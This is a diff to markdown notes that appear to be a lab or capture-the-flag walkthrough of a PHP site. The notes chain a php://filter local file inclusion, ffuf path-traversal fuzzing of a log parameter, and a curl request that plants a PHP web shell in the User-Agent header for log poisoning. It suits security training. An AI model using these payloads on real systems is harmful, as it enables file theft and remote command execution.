@@ -14,7 +14,13 @@ http://83.136.253.171:44707/index.php?page=php://filter/read=convert.base64-enco
 ![[Pasted image 20241011131524.png]]
 
 ```bash
-ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u http://83.136.253.171:4  
-4707/ilf_admin/index.php?log=../../../../../FUZZ -fs 2046
+ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -u http://83.136.253.171:44707/ilf_admin/index.php?log=../../../../../FUZZ -fs 2046
 ```
+
+![[Pasted image 20241011132046.png]]
+
+```php
+curl -A '<?php system($_GET['cmd']); ?>' http://83.136.253.171:44707
+```
+
 
